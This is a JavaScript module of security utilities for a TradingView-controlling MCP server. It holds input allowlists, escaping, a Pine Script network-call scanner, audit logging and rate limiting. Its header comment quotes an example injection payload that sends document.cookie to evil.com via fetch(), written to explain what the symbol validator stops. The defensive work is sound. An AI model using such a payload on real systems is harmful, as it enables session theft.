/**
 * Security utilities for Oracle MCP.
 *
 * Fixes vs. tradingview-mcp original:
 *   - safeString() is the same (JSON.stringify) — keep it
 *   - requireFinite() is the same — keep it
 *   - NEW: requireSymbol() — allowlist-pattern check so a symbol like
 *     `'; fetch("https://evil.com?c="+document.cookie); //` never reaches evaluate()
 *   - NEW: requireTimeframe() — only known TV timeframe strings allowed
 *   - NEW: requireChartType() — only allowed type names/numbers
 *   - NEW: sanitizePineSource() — scans Pine Script for outbound network calls
 *     (request.security, request.financial, etc.) and warns; does NOT block,
 *     because those calls are legitimate, but it logs the intent so the user knows.
 *   - NEW: audit() — append-only audit log to ~/.oracle-mcp-audit.log
 */

import fs from 'fs';
import os from 'os';
import path from 'path';

// ── Audit log ─────────────────────────────────────────────────────────────────

const AUDIT_PATH = path.join(os.homedir(), '.oracle-mcp-audit.log');

export function audit(tool, params, outcome = 'ok') {
  const entry = JSON.stringify({
    ts:      new Date().toISOString(),
    tool,
    params:  redactParams(params),
    outcome,
  });
  try {
    fs.appendFileSync(AUDIT_PATH, entry + '\n');
  } catch {
    // audit failures must not crash the server
  }
}

function redactParams(params) {
  if (!params || typeof params !== 'object') return params;
  const out = { ...params };
  // never log full Pine Script source in audit (can be 200KB+)
  if (out.source && typeof out.source === 'string' && out.source.length > 200) {
    out.source = `[Pine Script ${out.source.length} chars]`;
  }
  return out;
}

// ── String sanitization ───────────────────────────────────────────────────────

/**
 * Escape a string for safe interpolation into a JS expression evaluated via CDP.
 * JSON.stringify produces a properly-quoted, fully-escaped JS string literal.
 * This is identical to the original safeString() — it's already correct.
 */
export function safeString(str) {
  return JSON.stringify(String(str));
}

/**
 * Validate a finite number. Throws on NaN, Infinity, non-numeric.
 * Identical to original requireFinite() — it's already correct.
 */
export function requireFinite(value, name) {
  const n = Number(value);
  if (!Number.isFinite(n)) throw new Error(`${name} must be a finite number, got: ${value}`);
  return n;
}

// ── Input allowlists ──────────────────────────────────────────────────────────

// Ticker symbols: letters, digits, dots, colons, hyphens, underscores, plus (futures).
// Max 30 chars. Prevents injection via crafted symbol strings.
const SYMBOL_RE = /^[A-Z0-9:.+\-_\/]{1,30}$/i;

export function requireSymbol(symbol) {
  const s = String(symbol || '').trim().toUpperCase();
  if (!SYMBOL_RE.test(s)) {
    throw new Error(
      `Invalid symbol "${symbol}". Allowed: letters, digits, : . + - _ / (max 30 chars)`
    );
  }
  return s;
}

// Valid TradingView timeframe strings
const VALID_TIMEFRAMES = new Set([
  '1', '2', '3', '5', '10', '15', '20', '30', '45',
  '60', '90', '120', '180', '240',
  'D', '1D', 'W', '1W', 'M', '1M',
  '3M', '6M', '12M',
  // seconds-level (TV Desktop only)
  '1S', '5S', '15S', '30S',
]);

export function requireTimeframe(tf) {
  const t = String(tf || '').trim().toUpperCase();
  if (!VALID_TIMEFRAMES.has(t)) {
    throw new Error(
      `Invalid timeframe "${tf}". Allowed: ${[...VALID_TIMEFRAMES].join(', ')}`
    );
  }
  return t;
}

// Chart type map (same as original but centralised here)
const CHART_TYPE_MAP = {
  bars: 0, candles: 1, line: 2, area: 3, renko: 4,
  kagi: 5, pointandfigure: 6, linebreak: 7, heikinashi: 8, hollowcandles: 9,
};

export function requireChartType(chartType) {
  const key = String(chartType).toLowerCase().replace(/\s/g, '');
  if (key in CHART_TYPE_MAP) return CHART_TYPE_MAP[key];
  const n = Number(chartType);
  if (Number.isInteger(n) && n >= 0 && n <= 9) return n;
  throw new Error(`Invalid chart type "${chartType}". Use a name (Candles, Line…) or 0-9.`);
}

// ── Pine Script scanner ───────────────────────────────────────────────────────

// Patterns that make outbound network calls or access external data in Pine Script.
// We WARN (not block) because these are legitimate Pine uses — but the user should
// know their script makes external requests.
const PINE_NETWORK_PATTERNS = [
  { re: /request\.security\s*\(/i,   label: 'request.security() — fetches data from another symbol/TF via TradingView servers' },
  { re: /request\.financial\s*\(/i,  label: 'request.financial() — fetches fundamental data via TradingView servers' },
  { re: /request\.quandl\s*\(/i,     label: 'request.quandl() — fetches Quandl data (your IP + query logged)' },
  { re: /request\.earnings\s*\(/i,   label: 'request.earnings() — fetches earnings data via TradingView servers' },
];

/**
 * Scan Pine Script source for patterns that make external network requests.
 * Returns array of warning strings (empty if clean).
 * Does NOT modify the source.
 */
export function scanPineSource(source) {
  const warnings = [];
  for (const { re, label } of PINE_NETWORK_PATTERNS) {
    if (re.test(source)) warnings.push(label);
  }
  return warnings;
}

// ── Rate limiter (per-tool, in-memory) ───────────────────────────────────────

const _rateBuckets = new Map();

/**
 * Simple per-tool sliding-window rate limiter.
 * Throws if more than `maxCalls` have been made in the last `windowMs` ms.
 *
 * Defaults:
 *   - Most tools: 30 calls / 60s
 *   - Screenshot: 5 calls / 60s (expensive + privacy-sensitive)
 *   - Pine inject: 10 calls / 60s
 */
const RATE_LIMITS = {
  capture_screenshot:  { max: 5,  window: 60_000 },
  pine_set_source:     { max: 10, window: 60_000 },
  pine_smart_compile:  { max: 10, window: 60_000 },
  _default:            { max: 30, window: 60_000 },
};

export function checkRateLimit(tool) {
  const { max, window: windowMs } = RATE_LIMITS[tool] || RATE_LIMITS._default;
  const now = Date.now();
  const bucket = _rateBuckets.get(tool) || [];
  const recent = bucket.filter(ts => now - ts < windowMs);
  if (recent.length >= max) {
    throw new Error(`Rate limit: ${tool} allows ${max} calls per ${windowMs / 1000}s`);
  }
  recent.push(now);
  _rateBuckets.set(tool, recent);
}
